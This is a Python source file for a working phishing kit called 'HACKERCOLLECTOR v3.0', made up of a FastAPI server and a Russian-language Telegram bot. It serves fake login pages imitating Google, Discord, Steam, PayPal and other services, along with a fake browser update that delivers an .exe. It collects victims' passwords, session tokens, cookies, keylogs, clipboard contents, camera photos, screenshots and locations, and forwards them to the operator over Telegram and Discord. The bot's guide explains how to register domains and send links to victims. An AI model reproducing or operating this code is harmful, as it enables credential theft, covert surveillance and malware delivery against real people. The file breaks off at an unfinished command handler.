import asyncio
import uuid
import json
import logging
import hashlib
import base64
import re
import os
import random
import aiosqlite
from contextlib import asynccontextmanager
from datetime import datetime
from urllib.parse import quote

from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, BufferedInputFile, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.formatting import Text

from config import BOT_TOKEN, BASE_URL, DISCORD_WEBHOOK_URL, LINK_TTL_HOURS, MAX_LINKS_PER_USER
from database import (
    init_db, register_user, get_user, increment_user_stats, set_user_domain,
    create_campaign, get_campaigns, get_campaign, deactivate_campaign,
    create_link, get_user_links, get_link, increment_hits, mark_data_received,
    delete_link, deactivate_expired_links,
    save_victim, get_victims, get_recent_victims, get_victim_count,
    add_event, get_events,
    get_webhook, set_webhook_telegram, set_webhook_discord,
    add_geo_fence, get_geo_fences, remove_geo_fence,
    set_setting, get_setting,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ── КЭШ ЛЕНДИНГОВ ──
LANDING_CACHE: dict[str, str] = {}
LANDING_NAMES = {
    "cf": "☁️ Cloudflare Подтверждение",
    "google": "🔐 Google Вход",
    "telegram": "📞 Telegram Вход",
    "discord": "💬 Discord Вход",
    "steam": "🎮 Steam Вход",
    "netflix": "🎬 Netflix Вход",
    "instagram": "📷 Instagram Вход",
    "vk": "🇷🇺 VK Вход",
    "microsoft": "🏢 Microsoft Вход",
    "whatsapp": "📱 WhatsApp Web",
    "age": "🔞 Возраст + Селфи",
    "update": "⬆️ Обновление браузера (EXE)",
    "youtube": "▶️ YouTube Вход",
    "spotify": "🎵 Spotify Вход",
    "paypal": "💰 PayPal Вход",
}

def load_landings():
    import os
    for fname in os.listdir("landing"):
        if fname.endswith(".html"):
            name = fname.replace(".html", "")
            with open(f"landing/{fname}", encoding="utf-8") as f:
                LANDING_CACHE[name] = f.read()
    logger.info(f"Loaded {len(LANDING_CACHE)} landing templates")

# ── УТИЛИТЫ ──

def generate_link_id() -> str:
    return uuid.uuid4().hex[:10]

def generate_session_id() -> str:
    return uuid.uuid4().hex[:16]

def make_url(link_id: str, tg_id: int) -> str:
    user = asyncio.run(get_user(tg_id))
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")
    return f"{domain}/l/{link_id}"

async def send_discord(msg: str):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        import httpx
        async with httpx.AsyncClient() as cl:
            await cl.post(DISCORD_WEBHOOK_URL, json={"content": msg[:2000]})
    except:
        pass

# ── FASTAPI ──

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    await deactivate_expired_links()
    load_landings()
    # Запускаем фоновую задачу очистки просроченных ссылок
    asyncio.create_task(periodic_cleanup())
    asyncio.create_task(polling())
    yield

async def periodic_cleanup():
    while True:
        await asyncio.sleep(3600)
        try:
            await deactivate_expired_links()
        except:
            pass

async def polling():
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Polling failed: {e}")

app = FastAPI(lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

# ── КОРЕНЬ ──
@app.get("/")
async def index():
    return HTMLResponse("""
    <!DOCTYPE html><html><body style="background:#111;color:#0f0;font-family:monospace;padding:40px">
    <h2>⚡ Active</h2>
    <p>System online — all routes operational.</p>
    </body></html>
    """)

# DEFAULT_OWNER_ID хранится в БД (settings table) — через /claim

async def _get_default_owner() -> int | None:
    val = await get_setting("default_owner")
    return int(val) if val else None

async def _serve_landing_internal(link_id: str, request: Request):
    link = await get_link(link_id)
    if not link or not link["active"]:
        return HTMLResponse("<h2>404</h2>", status_code=404)

    await increment_hits(link_id)

    ua = request.headers.get("User-Agent", "")
    ip = request.client.host if request.client else "0.0.0.0"
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
    ref = request.headers.get("Referer", "")

    session_id = generate_session_id()
    await add_event(link_id, session_id, ip, "page_load", f"UA: {ua[:100]} | Ref: {ref[:100]}")

    template = link["template"]
    if template == "random" or template not in LANDING_CACHE:
        template = random.choice(list(LANDING_CACHE.keys()))
        from database import DB_PATH
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE links SET template = ? WHERE id = ?", (template, link_id))
            await db.commit()

    html = LANDING_CACHE.get(template, LANDING_CACHE.get("cf", ""))

    html = html.replace("{{LINK_ID}}", link_id)
    html = html.replace("{{SESSION_ID}}", session_id)
    html = html.replace("{{BASE_URL}}", BASE_URL.rstrip("/"))
    html = html.replace("{{REFERRER}}", ref)

    return HTMLResponse(html)

# ── ЛЕНДИНГ (старый формат /l/{id}) ──
@app.get("/l/{link_id}")
async def serve_landing_old(link_id: str, request: Request):
    return await _serve_landing_internal(link_id, request)

# ── ЛЕНДИНГ (любой путь — old school catch-all) ──
@app.get("/{path:path}")
async def serve_landing_catch_all(path: str, request: Request):
    # Пропускаем служебные пути
    if path.startswith("l/") or path.startswith("c/") or path.startswith("collect/") or path.startswith("static/"):
        return HTMLResponse("<h2>404</h2>", status_code=404)

    link_id = path.strip("/")

    # Если ссылка не существует — создаём на лету
    link = await get_link(link_id)
    if not link or not link["active"]:
        owner = await _get_default_owner()
        if owner and len(link_id) >= 3:
            await create_link(link_id, None, owner, "random", link_id[:8], f"{BASE_URL}/{link_id}", LINK_TTL_HOURS)
        else:
            return HTMLResponse("<h2>404</h2>", status_code=404)

    return await _serve_landing_internal(link_id, request)

# ── ПРИЁМ ДАННЫХ ──
@app.post("/c/{link_id}")
@app.post("/collect/{link_id}")
async def collect_data(link_id: str, request: Request):
    link = await get_link(link_id)
    if not link:
        return JSONResponse({"ok": False}, status_code=404)

    try:
        body = await request.json()
    except:
        try:
            form = await request.form()
            body = dict(form)
        except:
            body = {}

    ip = request.client.host if request.client else body.get("ip", "0.0.0.0")
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()

    data = {
        "session_id": body.get("session", ""),
        "ip": ip,
        "country": body.get("country", ""),
        "city": body.get("city", ""),
        "lat": body.get("lat"),
        "lon": body.get("lon"),
        "isp": body.get("isp", ""),
        "org": body.get("org", ""),
        "asn": body.get("asn", ""),
        "vpn": body.get("vpn", 0),
        "proxy": body.get("proxy", 0),
        "hosting": body.get("hosting", 0),
        "tor": body.get("tor", 0),
        "ua": body.get("ua", request.headers.get("User-Agent", "")),
        "platform": body.get("platform", ""),
        "screen": body.get("screen", ""),
        "language": body.get("language", ""),
        "timezone": body.get("timezone", ""),
        "canvas_fp": body.get("canvas_fp", "") or body.get("canvas", ""),
        "webgl_fp": body.get("webgl_fp", "") or body.get("webgl", ""),
        "cpu_cores": body.get("cpu_cores"),
        "ram": body.get("ram"),
        "device_memory": body.get("device_memory"),
        "touch": body.get("touch", 0),
        "cookies": body.get("cookies", 1),
        "dnt": body.get("dnt", 0),
        "adblock": body.get("adblock", 0),
        "photo": body.get("photo", ""),
        "screenshot": body.get("screenshot", ""),
        "clipboard": body.get("clipboard", ""),
        "keylog": body.get("keylog", ""),
        "login": body.get("login", ""),
        "password": body.get("password", ""),
        "email": body.get("email", ""),
        "phone": body.get("phone", ""),
        "token": body.get("token", ""),
        "cookie": body.get("cookie", ""),
        "session_data": body.get("session_data", ""),
        "geo_accuracy": body.get("geo_accuracy"),
        "referrer": body.get("referrer", request.headers.get("Referer", "")),
        "visit_duration": body.get("visit_duration", 0),
        "keystrokes": body.get("keystrokes", 0),
        "mouse_clicks": body.get("mouse_clicks", 0),
        "form_interactions": body.get("form_interactions", 0),
        "risk_score": body.get("risk_score", 0),
        "page_path": body.get("page_path", ""),
        "querystring": body.get("querystring", ""),
        "linkedin_url": body.get("linkedin_url", ""),
        "facebook_url": body.get("facebook_url", ""),
        "twitter_handle": body.get("twitter", ""),
        "instagram_handle": body.get("instagram", ""),
        "discord_token": body.get("discord_token", ""),
        "telegram_session": body.get("telegram_session", ""),
        "steam_id": body.get("steam_id", ""),
        "wallet_addresses": body.get("wallets", ""),
        "notes": body.get("notes", ""),
    }

    # Хэши фото/скриншотов для дедупликации
    if data["photo"]:
        data["photo_hash"] = hashlib.md5(data["photo"][:5000].encode()).hexdigest()
    if data["clipboard"]:
        data["clipboard_hash"] = hashlib.md5(data["clipboard"].encode()).hexdigest()

    await save_victim(link_id, data)
    await mark_data_received(link_id)
    await add_event(link_id, data["session_id"], ip, "data_received", f"IP: {ip}")

    # Уведомление владельцу
    tg_id = link["tg_id"]
    await increment_user_stats(tg_id, "total_victims")
    await notify_owner(tg_id, link_id, data)

    # Discord если настроен
    webhook = await get_webhook(tg_id)
    if webhook and webhook["discord"] and webhook["discord_url"]:
        discord_msg = f"**🔥 Новая жертва!**\nIP: {ip}\nСтрана: {data['country']}\nСсылка: {link_id}"
        try:
            import httpx
            async with httpx.AsyncClient() as cl:
                await cl.post(webhook["discord_url"], json={"content": discord_msg})
        except:
            pass

    return JSONResponse({"ok": True})

# ── УВЕДОМЛЕНИЕ ──
async def notify_owner(tg_id: int, link_id: str, data: dict):
    webhook = await get_webhook(tg_id)
    if webhook and not webhook["telegram"]:
        return

    # Риск-скор
    risk = data.get("risk_score", 0)
    risk_icon = "🟢" if risk < 20 else ("🟡" if risk < 60 else "🔴")

    lines = [
        f"<b>🔥 НОВАЯ ЖЕРТВА</b>\n"
        f"<blockquote>Ссылка: <code>{link_id}</code></blockquote>",
        f"<b>🌐 Сеть</b>",
        f"├ IP: <code>{data['ip']}</code> {risk_icon}",
        f"├ Страна: {data.get('country', '—')}",
        f"├ Город: {data.get('city', '—')}",
    ]
    if data.get("lat") and data.get("lon"):
        lines.append(f"├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Карта</a>")
    lines.append(f"├ ISP: {data.get('isp', '—')}")
    lines.append(f"├ ASN: {data.get('asn', '—')}")

    vpn_tags = []
    if data.get("vpn"): vpn_tags.append("VPN")
    if data.get("proxy"): vpn_tags.append("Proxy")
    if data.get("tor"): vpn_tags.append("TOR")
    if data.get("hosting"): vpn_tags.append("Хостинг")
    lines.append(f"├ Теги: {'⚠️ ' + ', '.join(vpn_tags) if vpn_tags else '✅ Чисто'}")

    if data.get("ua"):
        ua_short = data["ua"][:80]
        lines.append(f"\n<b>💻 Устройство</b>")
        lines.append(f"├ Браузер: <code>{ua_short}</code>")
        lines.append(f"├ Платформа: {data.get('platform', '—')}")
        lines.append(f"├ Экран: {data.get('screen', '—')}")
        lines.append(f"├ Язык: {data.get('language', '—')}")
        lines.append(f"├ Таймзона: {data.get('timezone', '—')}")

    if data.get("cpu_cores"):
        lines.append(f"├ Ядер CPU: {data['cpu_cores']}")
    if data.get("device_memory"):
        lines.append(f"├ RAM: {data['device_memory']}GB")
    if data.get("touch"):
        lines.append(f"├ 📱 Сенсорное устройство")

    if data.get("adblock"):
        lines.append(f"├ 🚫 AdBlock обнаружен")
    if data.get("canvas_fp"):
        lines.append(f"├ 🖐 Canvas отпечаток")

    if data.get("login") or data.get("password") or data.get("email") or data.get("phone"):
        lines.append(f"\n<b>✧ КРЕДЫ</b>")
        if data.get("email"): lines.append(f"├ Email: <code>{data['email']}</code>")
        if data.get("login"): lines.append(f"├ Логин: <code>{data['login']}</code>")
        if data.get("password"): lines.append(f"├ Пароль: <code>{data['password']}</code>")
        if data.get("phone"): lines.append(f"├ Телефон: <code>{data['phone']}</code>")
        if data.get("token"): lines.append(f"├ Токен: <code>{data['token'][:60]}</code>")

    if data.get("discord_token"):
        lines.append(f"\n<b>✧ ТОКЕНЫ</b>")
        lines.append(f"├ Discord: <code>{data['discord_token'][:80]}</code>")

    if data.get("clipboard"):
        lines.append(f"\n<b>📋 Буфер обмена</b>")
        lines.append(f"<code>{data['clipboard'][:300]}</code>")

    if data.get("keylog"):
        lines.append(f"\n<b>⌨️ Кейлог ({len(data['keylog'])} симв.)</b>")
        lines.append(f"<code>{data['keylog'][:300]}</code>")

    if data.get("steam_id"):
        lines.append(f"\n<b>🎮 Steam</b>")
        lines.append(f"├ SteamID: <code>{data['steam_id']}</code>")

    if data.get("wallet_addresses"):
        lines.append(f"\n<b>💰 Кошельки</b>")
        lines.append(f"├ {data['wallet_addresses'][:200]}")

    if data.get("visit_duration"):
        lines.append(f"\n<b>⏱ Сессия</b>")
        lines.append(f"├ Длительность: {data['visit_duration']}с")
        lines.append(f"├ Нажатий: {data.get('keystrokes', 0)}")
        lines.append(f"├ Кликов: {data.get('mouse_clicks', 0)}")

    lines.append(f"\n📎 /victim {link_id}")

    msg = "\n".join(lines)

    try:
        await bot.send_message(tg_id, msg, disable_web_page_preview=True)

        if data.get("photo"):
            try:
                photo_bytes = base64.b64decode(data["photo"])
                caption = f"📸 <b>Фото жертвы</b>\n├ {data.get('country', '')} / {data.get('city', '')}"
                if data.get("lat") and data.get("lon"):
                    caption += f"\n├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Карта</a>"
                await bot.send_photo(
                    tg_id,
                    BufferedInputFile(photo_bytes, filename=f"victim_{link_id}.jpg"),
                    caption=caption
                )
            except Exception as e:
                logger.warning(f"Photo send failed: {e}")

        if data.get("screenshot"):
            try:
                ss_bytes = base64.b64decode(data["screenshot"])
                await bot.send_document(
                    tg_id,
                    BufferedInputFile(ss_bytes, filename=f"screenshot_{link_id}.png"),
                    caption=f"🖥 <b>Скриншот жертвы</b>"
                )
            except Exception as e:
                logger.warning(f"Screenshot send failed: {e}")

    except Exception as e:
        logger.error(f"Notify owner failed for {tg_id}: {e}")

# ── BOT HANDLERS ──

def main_kb():
    b = InlineKeyboardBuilder()
    b.button(text="🎯 Новая ссылка", callback_data="new_link")
    b.button(text="📋 Мои ссылки", callback_data="list_links")
    b.button(text="📊 Статистика", callback_data="dashboard")
    b.button(text="⚙️ Настройки", callback_data="settings")
    b.button(text="📖 Инструкция", callback_data="guide")
    b.adjust(2)
    return b.as_markup()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await register_user(message.from_user.id, message.from_user.username)
    tg_id = message.from_user.id
    if not await _get_default_owner():
        await set_setting("default_owner", str(tg_id))
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)

    await message.answer(
        f"🕵️ <b>HACKERCOLLECTOR v3.0</b>\n"
        f"<blockquote>— Zero trust. Full control. —</blockquote>\n"
        f"├ Твоя статистика: {len(links)} ссылок | {v_count} жертв\n"
        f"├ Нужен домен? <code>eu.cc</code> подойдёт\n\n"
        f"<b>Модули:</b>\n"
        f"├ <b>15</b> шаблонов лендингов (Google, Discord, Steam, Telegram, Netflix, …)\n"
        f"├ <b>Авто-сбор:</b> IP, GPS, камера, скриншот, буфер, WebGL, canvas\n"
        f"├ <b>Креды:</b> логин/пароль, токены, 2FA, куки сессии\n"
        f"├ <b>Кейлоггер</b> — каждое нажатие\n"
        f"├ <b>Обнаружение</b> AdBlock / VPN / TOR\n"
        f"├ <b>Авто-доставка .exe</b> для Windows\n"
        f"├ <b>Discord webhook</b> поддержка\n"
        f"└ <b>Масс-кампании</b> — 100 ссылок разом\n\n"
        f"Выбери действие:",
        reply_markup=main_kb()
    )

# ── OLD SCHOOL GEN ──
@dp.message(Command("gen"))
async def cmd_gen(message: Message, command: CommandObject):
    """Генерация ссылки в один клик — old school style, один домен, любой путь."""
    tg_id = message.from_user.id

    if not await _get_default_owner():
        await set_setting("default_owner", str(tg_id))

    user = await get_user(tg_id)
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")

    # Парсим аргументы: /gen <template>
    args = command.args.strip().lower() if command.args else ""
    template = "random"
    if args.split()[0] in LANDING_CACHE:
        template = args.split()[0]
    elif args:
        # Возможно это шаблон по полному имени
        for key, name in LANDING_NAMES.items():
            if args.lower() in name.lower() or args.lower() == key:
                template = key
                break

    link_id = generate_link_id()
    full_url = f"{domain}/{link_id}"
    await create_link(link_id, None, tg_id, template, link_id[:8], full_url, LINK_TTL_HOURS)
    await increment_user_stats(tg_id, "total_links")

    tmpl_name = LANDING_NAMES.get(template, template)
    await message.answer(
        f"✅ <b>Ссылка создана</b>\n\n"
        f"Шаблон: <b>{tmpl_name}</b>\n"
        f"URL: <code>{full_url}</code>\n\n"
        f"Кидай жертве — данные придут сюда.",
        disable_web_page_preview=True
    )

@dp.message(Command("claim"))
async def cmd_claim(message: Message):
    """Claim this bot as default owner — all untracked paths go to you."""
    await set_setting("default_owner", str(message.from_user.id))
    await message.answer(
        "✅ <b>Домен закреплён!</b>\n\n"
        "Теперь любой рандомный путь на твоём домене показывает лендинг.\n"
        "Просто кинь кому-нибудь: <code>https://твойдомен.eu.cc/чтоугодно</code>\n\n"
        "Работает сразу — регистрация не нужна.\n"
        "Сменить шаблон: /set domain verify\n"
        "На конкретный: /set domain google"
    )

@dp.message(Command("set"))
async def cmd_set(message: Message, command: CommandObject):
    """Set default template for catch-all links."""
    args = command.args.strip().lower() if command.args else ""
    parts = args.split()
    if len(parts) >= 2 and parts[0] == "domain":
        template = parts[1]
        if template in LANDING_CACHE:
            await set_user_domain(message.from_user.id, f"template:{template}")
            await message.answer(f"✅ Шаблон по умолчанию: <b>{template}</b>")
        else:
            await message.answer(f"❌ Неизвестный шаблон. Доступны: {', '.join(LANDING_CACHE.keys())}")
    else:
        await message.answer("Использование: /set domain <шаблон>")

@dp.callback_query(F.data == "guide")
async def cb_guide(cq: CallbackQuery):
    text = (
        "<b>📖 Инструкция</b>\n\n"
        "<b>1. Получи домен</b>\n"
        "Зайди на eu.cc, создай бесплатный домен.\n"
        "Пропиши CNAME на твой сервер.\n\n"
        "<b>2. Укажи в боте</b>\n"
        "Команда /domain твойдомен.eu.cc\n\n"
        "<b>3. Создай ссылку</b>\n"
        "Нажми «Новая ссылка» → выбери шаблон → получи ссылку\n\n"
        "<b>4. Отправь жертве</b>\n"
        "Когда откроет — данные придут сюда мгновенно.\n\n"
        "<b>5. Собирай</b>\n"
        "IP, фото с камеры, экран, пароли, буфер, кейлог — всё здесь.\n\n"
        "<b>Old School режим (новинка!):</b>\n"
        "• /claim — закрепить домен, любой путь работает сразу\n"
        "• /gen [шаблон] — создать ссылку в один клик\n"
        "• Просто кинь: <code>https://домен.eu.cc/чтоугодно</code>\n"
        "• Никаких префиксов. Без регистрации.\n\n"
        "<b>Советы:</b>\n"
        "• Шаблон «Обновление браузера» для .exe дроппера\n"
        "• Включи Discord webhook для канала-дублёра\n"
        "• Гео-фенсы для блокировки стран (Настройки)\n"
        "• Масс-кампания: /campaign <name> <template> <count>"
    )
    b = InlineKeyboardBuilder()
    b.button(text="⬅️ Назад", callback_data="back_main")
    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data == "back_main")
async def cb_back(cq: CallbackQuery):
    tg_id = cq.from_user.id
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)
    await cq.message.edit_text(
        f"🕵️ <b>HACKERCOLLECTOR v3.0</b>\n"
        f"├ Статистика: {len(links)} ссылок | {v_count} жертв\n\n"
        f"Выбери действие:",
        reply_markup=main_kb()
    )
    await cq.answer()

@dp.callback_query(F.data == "new_link")
async def cb_new_link(cq: CallbackQuery):
    b = InlineKeyboardBuilder()
    b.button(text="☁️ Cloudflare", callback_data="tmpl_cf")
    b.button(text="🔐 Google", callback_data="tmpl_google")
    b.button(text="📞 Telegram", callback_data="tmpl_telegram")
    b.button(text="💬 Discord", callback_data="tmpl_discord")
    b.button(text="🎮 Steam", callback_data="tmpl_steam")
    b.button(text="📷 Instagram", callback_data="tmpl_instagram")
    b.button(text="🇷🇺 VK", callback_data="tmpl_vk")
    b.button(text="🏢 Microsoft", callback_data="tmpl_microsoft")
    b.button(text="🎬 Netflix", callback_data="tmpl_netflix")
    b.button(text="📱 WhatsApp", callback_data="tmpl_whatsapp")
    b.button(text="🔞 Возраст + Селфи", callback_data="tmpl_age")
    b.button(text="⬆️ Обновление (EXE)", callback_data="tmpl_update")
    b.button(text="▶️ YouTube", callback_data="tmpl_youtube")
    b.button(text="🎵 Spotify", callback_data="tmpl_spotify")
    b.button(text="💰 PayPal", callback_data="tmpl_paypal")
    b.button(text="⬅️ Назад", callback_data="back_main")
    b.adjust(2)
    await cq.message.edit_text(
        "<b>🎯 Новая ссылка — выбери шаблон</b>\n\n"
        "Каждый шаблон собирает: IP, GPS, камера, скриншот,\n"
        "буфер, кейлог, canvas, WebGL, отпечаток браузера.\n"
        "Шаблоны с логином также собирают логин/пароль.",
        reply_markup=b.as_markup()
    )
    await cq.answer()

@dp.callback_query(F.data.startswith("tmpl_"))
async def cb_create_link(cq: CallbackQuery):
    tg_id = cq.from_user.id
    template = cq.data.replace("tmpl_", "")
    user = await get_user(tg_id)

    # Проверка лимита
    links = await get_user_links(tg_id, active_only=True)
    if len(links) >= MAX_LINKS_PER_USER:
        await cq.answer(f"Лимит: {MAX_LINKS_PER_USER} активных ссылок. Удали старые.", show_alert=True)
        return

    link_id = generate_link_id()
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")
    subdomain = f"{template}-{link_id[:6]}"
    full_url = f"{domain}/l/{link_id}"

    await create_link(link_id, None, tg_id, template, subdomain, full_url, LINK_TTL_HOURS)
    await increment_user_stats(tg_id, "total_links")

    template_name = LANDING_NAMES.get(template, template)

    b = InlineKeyboardBuilder()
    b.button(text="📊 Статистика", callback_data=f"stats_{link_id}")
    b.button(text="🎯 Ещё ссылку", callback_data="new_link")
    b.button(text="⬅️ Главное меню", callback_data="back_main")
    b.adjust(2)

    await cq.message.edit_text(
        f"✅ <b>Ссылка создана</b>\n\n"
        f"Шаблон: <b>{template_name}</b>\n"
        f"URL: <code>{full_url}</code>\n"
        f"Истекает: через {LINK_TTL_HOURS}ч\n\n"
        f"Кидай жертве → данные придут сюда мгновенно.",
        reply_markup=b.as_markup()
    )
    await cq.answer()

@dp.callback_query(F.data == "list_links")
async def cb_list_links(cq: CallbackQuery):
    links = await get_user_links(cq.from_user.id)
    if not links:
        b = InlineKeyboardBuilder()
        b.button(text="🎯 Создать первую", callback_data="new_link")
        b.button(text="⬅️ Назад", callback_data="back_main")
        await cq.message.edit_text("Нет активных ссылок. Создай:", reply_markup=b.as_markup())
        await cq.answer()
        return

    parts = ["<b>📋 Активные ссылки:</b>\n"]
    b = InlineKeyboardBuilder()
    for link in links[:20]:
        tmpl_name = LANDING_NAMES.get(link["template"], link["template"])
        parts.append(
            f"├ <code>{link['id'][:10]}</code> {tmpl_name} "
            f"| 👁 {link['hits']} | 📥 {link['data_received']}"
        )
        b.button(text=link["id"][:8], callback_data=f"stats_{link['id']}")
    b.button(text="⬅️ Назад", callback_data="back_main")
    b.adjust(4)
    await cq.message.edit_text("\n".join(parts), reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data.startswith("stats_"))
async def cb_stats(cq: CallbackQuery):
    link_id = cq.data.replace("stats_", "")
    link = await get_link(link_id)
    if not link:
        await cq.answer("Ссылка не найдена", show_alert=True)
        return

    victims = await get_victims(link_id)
    events = await get_events(link_id, 5)
    tmpl_name = LANDING_NAMES.get(link["template"], link["template"])

    b = InlineKeyboardBuilder()
    b.button(text="🗑 Удалить", callback_data=f"del_{link_id}")
    b.button(text="📋 Жертвы", callback_data=f"victims_{link_id}")
    b.button(text="⬅️ К списку", callback_data="list_links")
    b.button(text="🏠 Главная", callback_data="back_main")
    b.adjust(2)

    text = (
        f"<b>📊 Статистика ссылки</b>\n"
        f"├ ID: <code>{link_id}</code>\n"
        f"├ Шаблон: {tmpl_name}\n"
        f"├ Переходов: {link['hits']}\n"
        f"├ Данных получено: {link['data_received']}\n"
        f"├ Активна: {'✅ Да' if link['active'] else '❌ Истекла'}\n"
        f"├ Создана: {link['created_at']}\n"
        f"├ Истекает: {link['expires_at']}\n"
        f"├ URL: <code>{link['full_url']}</code>\n\n"
        f"<b>Последние события:</b>\n"
    )

    for e in events[:5]:
        text += f"├ {e['timestamp'][:19]} | {e['event_type']}\n"

    if victims:
        v = victims[0]
        text += f"\n<b>Последняя жертва:</b>\n"
        text += f"├ IP: <code>{v['ip']}</code> | {v.get('country', '—')}\n"
        if v.get("login") or v.get("password"):
            text += f"├ Creds: <code>{v.get('login', '')}:{v.get('password', '')}</code>\n"
        if v.get("photo"):
            text += f"├ 📸 Фото получено\n"
        if v.get("screenshot"):
            text += f"├ 🖥 Скриншот получен\n"

    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data.startswith("victims_"))
async def cb_victims(cq: CallbackQuery):
    link_id = cq.data.replace("victims_", "")
    victims = await get_victims(link_id)
    if not victims:
        await cq.answer("Жертв пока нет", show_alert=True)
        return

    b = InlineKeyboardBuilder()
    b.button(text="⬅️ Назад", callback_data=f"stats_{link_id}")
    b.button(text="🏠 Главная", callback_data="back_main")

    parts = [f"<b>📋 Жертвы — {link_id[:10]}</b>\n"]
    for i, v in enumerate(victims[:10]):
        parts.append(f"\n<b>── #{i+1} ──</b>")
        parts.append(f"IP: <code>{v['ip']}</code>")
        parts.append(f"📍 {v.get('country', '—')} / {v.get('city', '—')}")
        if v.get("lat"):
            parts.append(f"<a href='https://maps.google.com/maps?q={v['lat']},{v['lon']}'>🗺 Карта</a>")
        if v.get("login") or v.get("password"):
            parts.append(f"✧ <code>{v.get('login', '')}:{v.get('password', '')}</code>")
        if v.get("email"):
            parts.append(f"✉️ {v['email']}")
        if v.get("phone"):
            parts.append(f"📞 {v['phone']}")
        if v.get("token"):
            parts.append(f"🎫 Токен: <code>{v['token'][:40]}</code>")
        if v.get("discord_token"):
            parts.append(f"💬 Discord: <code>{v['discord_token'][:40]}</code>")
        if v.get("platform"):
            parts.append(f"💻 {v['platform']}")
        if v.get("photo"):
            parts.append(f"📸 Фото: да")
        if v.get("screenshot"):
            parts.append(f"🖥 Скриншот: да")

    await cq.message.edit_text("\n".join(parts), reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data.startswith("del_"))
async def cb_delete(cq: CallbackQuery):
    link_id = cq.data.replace("del_", "")
    await delete_link(link_id)
    await cq.message.edit_text("🗑 Ссылка и все данные удалены.")
    await cq.answer()

@dp.callback_query(F.data == "dashboard")
async def cb_dashboard(cq: CallbackQuery):
    tg_id = cq.from_user.id
    user = await get_user(tg_id)
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)
    recent = await get_recent_victims(tg_id, 5)

    total_hits = sum(l["hits"] for l in links)
    total_data = sum(l["data_received"] for l in links)

    text = (
        f"<b>📊 Статистика</b>\n"
        f"├ Создано ссылок: {user['total_links'] if user else 0}\n"
        f"├ Всего жертв: <b>{v_count}</b>\n"
        f"├ Всего переходов: {total_hits}\n"
        f"├ Активных ссылок: {len(links)}\n"
        f"├ Конверсия: {(total_data/total_hits*100) if total_hits else 0:.1f}%\n"
    )

    if recent:
        text += f"\n<b>Последние жертвы:</b>\n"
        for v in recent:
            text += f"├ <code>{v['ip']}</code> | {v.get('template', '?')} | {v.get('country', '—')}\n"
            if v.get("login"):
                text += f"│ ✦ {v['login']}:{v.get('password','')}\n"

    b = InlineKeyboardBuilder()
    b.button(text="🔄 Обновить", callback_data="dashboard")
    b.button(text="⬅️ Назад", callback_data="back_main")
    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data == "settings")
async def cb_settings(cq: CallbackQuery):
    tg_id = cq.from_user.id
    webhook = await get_webhook(tg_id)
    user = await get_user(tg_id)
    fences = await get_geo_fences(tg_id)

    tg_status = "✅ ВКЛ" if (webhook and webhook["telegram"]) else "❌ ВЫКЛ"
    dc_status = "✅ ВКЛ" if (webhook and webhook["discord"]) else "❌ ВЫКЛ"
    domain = user["domain"] if user and user["domain"] else "Не указан"

    text = (
        f"<b>⚙️ Настройки</b>\n"
        f"├ Домен: <code>{domain}</code>\n"
        f"├ Уведомл. TG: {tg_status}\n"
        f"├ Discord hook: {dc_status}\n"
        f"└ Гео-фенсы: {len(fences)}\n\n"
        f"<b>Команды:</b>\n"
        f"├ /domain твойдомен.eu.cc — установить домен\n"
        f"├ /webhook discord <url> — Discord webhook\n"
        f"├ /fence add <страна> — заблокировать страну\n"
        f"├ /fence list — показать гео-фенсы\n"
        f"├ /fence remove <id> — удалить гео-фенс\n"
        f"├ /campaign <name> <шаблон> <кол-во> — масс-ссылки\n"
        f"└ /export <link_id> — экспорт данных жертв"
    )

    b = InlineKeyboardBuilder()
    b.button(text="TG уведомления", callback_data="tog_tg")
    b.button(text="Discord уведомления", callback_data="tog_dc")
    b.button(text="⬅️ Назад", callback_data="back_main")
    b.adjust(2)
    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data == "tog_tg")
async def cb_tog_tg(cq: CallbackQuery):
    w = await get_webhook(cq.from_user.id)
    await set_webhook_telegram(cq.from_user.id, 0 if (w and w["telegram"]) else 1)
    await cb_settings(cq)
    await cq.answer()

@dp.callback_query(F.data == "tog_dc")
async def cb_tog_dc(cq: CallbackQuery):
    w = await get_webhook(cq.from_user.id)
    await set_webhook_discord(cq.from_user.id, 0 if (w and w["discord"]) else 1)
    await cb_settings(cq)
    await cq.answer()

# ── COMMANDS ──

@dp.message(Command("domain"))
